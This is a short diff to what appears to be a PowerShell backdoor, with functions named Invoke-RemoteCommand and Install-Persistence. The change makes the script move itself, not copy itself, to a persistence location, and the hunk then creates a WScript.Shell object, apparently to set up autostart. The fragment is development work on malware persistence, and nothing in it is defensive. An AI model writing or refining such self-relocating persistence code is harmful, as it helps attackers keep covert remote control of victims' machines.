@@ -64,7 +64,7 @@ function Invoke-RemoteCommand {
 function Install-Persistence {
     try {
         if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
-            Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
+            Move-Item -Path $PSCommandPath -Destination $scriptPath -Force
         }
         
         $WshShell = New-Object -ComObject WScript.Shell
